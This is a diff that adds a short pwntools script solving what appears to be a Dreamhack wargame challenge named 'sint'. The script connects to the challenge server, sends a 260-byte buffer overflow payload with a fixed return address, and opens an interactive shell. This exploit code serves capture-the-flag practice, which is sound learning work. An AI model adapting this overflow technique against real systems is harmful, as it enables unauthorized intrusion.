@@ -1,0 +1,25 @@
+from pwn import *
+
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+r = remote("host1.dreamhack.games", 18748)
+# r = process("./sint")
+
+
+r.sendline("0")
+
+payload = b"a" * 260
+payload += p32(0x08048659)
+
+r.sendline(payload)
+r.interactive()
+
+
+
